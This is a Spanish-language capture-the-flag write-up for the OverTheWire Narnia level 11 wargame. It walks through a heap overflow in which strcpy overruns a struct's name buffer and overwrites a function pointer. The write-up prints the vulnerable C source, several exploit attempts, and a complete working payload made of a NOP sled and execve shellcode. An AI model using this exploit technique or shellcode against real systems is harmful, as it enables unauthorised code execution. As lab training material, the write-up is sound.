*[Image: banner]*

```bash
$ ssh narnia11@narnia.labs.overthewire.org -p 2226

$ echo $TARGET
> una estructura en el heap · un puntero de función contiguo · el método que el objeto no eligió

$ echo $VECTOR
> heap overflow · function pointer overwrite · secuestro de llamada dinámica
```

---

## `> [RECON]`

```bash
$ cat /narnia/narnia11.c
```

```c
struct User {
    char name[32];
    void (*print_privileges)();
};
[...]
struct User *u = malloc(sizeof(struct User));
strcpy(u->name, argv[1]);
[...]
u->print_privileges();
```

La pila quedó atrás.

Todo este tiempo: Narnia 0 al 10: el campo de batalla era el stack.
Variables locales. Frame pointers. Direcciones de retorno.
Un espacio lineal con reglas conocidas.

El heap es otra cosa.
No tiene el orden del stack.
Los objetos nacen y mueren sin secuencia fija.
Pero tienen estructura interna.
Y esa estructura tiene punteros.

`name` y `print_privileges` viven en el mismo bloque de `malloc`.
Contiguos. Sin separación.
`strcpy` no sabe que después del byte 32 hay un puntero de función.
Copia hasta `\x00`. Y sigue.

---

## `> [HYPOTHESIS]`

```diff
+ name (32 bytes) y print_privileges (4 bytes) son contiguos en el mismo bloque de heap.
+ strcpy no tiene límite. el byte 33 pisa el primer byte del puntero de función.
+ si controlamos los bytes 33-36, controlamos a dónde salta u->print_privileges().
+ system() en libc o shellcode en entorno como destino.
- busqué el EIP en el stack. el crash no toca EBP ni EIP típicos de la pila.
  el heap tiene su propia anatomía. hay que mirar ahí.
```

---

## `> [ATTEMPTS]`

<details>
<summary><code>// 3l h34p t13n3 su pr0p14 4n4t0mí4.</code></summary>

```bash
#: intento 1
$ /narnia/narnia11 $(python3 -c 'print("A"*40)')
# Segmentation fault
# el puntero de función intentó saltar a 0x41414141.
# los bytes 33-36 de nuestra entrada llegaron al puntero.
# confirmado: la estructura está rota.

#: intento 2
# necesitamos la dirección de system() y "/bin/sh" en el entorno.
gdb$ print system
# $1 = 0xf7e4c860
$ export ARG=$(python3 -c 'import sys; sys.stdout.buffer.write(b"/bin/sh\x00")')
# programa auxiliar para obtener la dirección de ARG en el entorno del proceso.
# dirección: 0xffffd9c0

#: intento 3
# primer payload. 32 bytes de relleno + dirección de system().
# system() necesita que su argumento esté en la pila en el momento de la llamada.
# la arquitectura de la llamada dinámica es distinta a un ret clásico.
$ /narnia/narnia11 $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*32 + b"\x60\xc8\xe4\xf7")')
# shell incompleta. system() ejecutó pero sin argumento válido.

#: intento 4: ahí.
# shellcode en variable de entorno. el puntero apunta al NOP sled.
$ export PAYLOAD=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*200 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")')
# dirección de PAYLOAD: 0xffffd8a0
$ /narnia/narnia11 $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*32 + b"\xa0\xd8\xff\xff")')
```

```txt
puntero de función: secuestrado.
u->print_privileges() → shellcode.
shell: narnia12 / root.
```

</details>

---

## `> [BREAK]`

La estructura antes:

```
heap ↓

  [ u->name (32 bytes) ] [ u->print_privileges (4 bytes) ]
   A A A A ... (32)        → 0xf7e6a340 (función legítima)
```

La estructura después de `strcpy`:

```
  [ u->name (32 bytes) ] [ u->print_privileges (4 bytes) ]
   A A A A ... (32)        → 0xffffd8a0 (tu shellcode)
```

Cuando el binario ejecuta `u->print_privileges()`,
no llama a la función que el programador registró.
Llama a lo que tú pusiste en esos cuatro bytes.

No tocaste el stack.
No sobreescribiste ninguna dirección de retorno.
Cambiaste el método que el objeto iba a invocar.

El objeto siguió siendo el mismo.
Su comportamiento no.

En 2001, Phrack 57 formalizó esto para el heap completo: estructuras de `malloc`, metadata de chunks, `free()` como primitiva de escritura.
La pila tenía su literatura desde Aleph One en 1996.
El heap tuvo la suya cinco años después.

Narnia termina aquí.
La pila, el entorno, el heap.
Tres territorios. Misma lógica:
encontrar el puntero que nadie estaba vigilando
y reemplazar lo que señala.

> *→ [`/lore/once_upon_free.md`](../lore/once_upon_free.md)*

---

## `> [EXPLOIT]`

```bash
export PAYLOAD=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*200 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")')
/narnia/narnia11 $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*32 + b"\xa0\xd8\xff\xff")')
```

```
b"A"*32              → rellena name exactamente. ni uno más, ni uno menos.
b"\xa0\xd8\xff\xff"  → los bytes 33-36. el puntero de función.
                        little endian. la CPU lee al revés.
                        eso ya lo sabes desde Narnia 0.
PAYLOAD en entorno   → shellcode fuera de la estructura.
                        dirección estable. sin ASLR.
u->print_privileges()→ el objeto llama a su método.
                        el método ya no es suyo.
```

---

## `> [FLAG]`

```
[REDACTED]
```

> n0 m3 l4 d1g4s. n0 m3 1nt3r3s4.
> 3l pr3m10 n0 3s un str1ng d3 t3xt0.

---

## `> [REFLECTION]`

```diff
+ heap ≠ stack. la anatomía es distinta. los punteros de función son el objetivo aquí.
+ name y print_privileges son contiguos. strcpy no sabe dónde termina uno y empieza el otro.
+ 32 bytes exactos de relleno. el byte 33 ya es el puntero. medir antes de disparar.
+ shellcode en entorno: el mismo patrón desde Narnia 2. sigue funcionando.
- buscar EIP en el stack cuando el crash viene del heap → vector incorrecto.
- system() sin argumento preparado → shell incompleta. el contexto importa.
```

---

## `> echo $FINAL`

Narnia 0 tenía cuatro bytes que sobraban.
Narnia 11 tiene un puntero que nadie vigilaba.

Entre los dos: once niveles.
Once formas distintas de encontrar el punto donde
la suposición del programador
y la realidad de la memoria
no coinciden.

Eso es lo único que buscabas en todo momento.
No el flag. No la shell.
El punto de quiebre.

La pregunta que sigue no es qué viene después de Narnia.
Es qué harías con esto en un sistema real.
Con ASLR activo. Con NX activo. Con canaries. Con RELRO full.
Con un equipo de seguridad monitoreando.

Eso no es un wargame.
Eso es el trabajo.

Busca **HackTheBox Pro Labs**.
Busca **OSCP**.
Busca tu primer CVE.

El tablero de Narnia está completo.
El tablero real acaba de empezar.

---

```
█████████████████████████████████████████████
█                                           █
█   3l punter0 qu3 n4d13 v1g1l4b4          █
█         fu3 3l qu3 l0 c4mb10 t0d0.       █
█                                           █
█   n4rn14 c0mpl3t0.                       █
█         3l r3st0 n0 t13n3 t3rm1n4l.      █
█                                           █
█████████████████████████████████████████████
```

> *→[https://youtube.com/t474-r0b07](https://youtube.com/@kaderd.garnica?si=9vk1E6Gkkb7LftTK)*
---

> *→ anterior: [narnia0](narnia00.md)*

> > 🔴 **LA SERIE NARNIA HA TERMINADO**
>
> El lore completo está en la biblioteca.
> Lo que sigue no tiene writeup todavía.
>
> 🧭 **[ÍNDICE DEL LORE](https://github.com/t474-r0b07/ctf-writeups/tree/main/lore)**

---
<!-- 0x45 0x4e 0x44 // n4rn14 c0mpl3t0. 3l r3st0 3mp13z4 4h0r4. -->
